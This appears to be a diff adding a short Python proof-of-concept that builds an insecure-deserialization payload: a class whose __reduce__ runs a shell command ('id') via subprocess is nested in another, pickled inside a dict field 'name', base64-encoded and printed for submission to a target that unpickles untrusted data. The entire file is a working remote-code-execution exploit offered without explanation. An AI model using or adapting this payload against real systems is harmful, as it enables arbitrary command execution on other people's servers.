@@ -1,0 +1,13 @@
+import base64
+import codecs
+import pickle
+class RCE(object):
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.check_output, (['id'], ) )
+class RCEStr(object):
+    def __reduce__(self):
+        return (codecs.decode, (RCE(), 'utf-8') )
+pickle_data = pickle.dumps({'name': RCEStr()})
+payload = base64.urlsafe_b64encode(pickle_data)
+print(payload.decode('utf-8'))
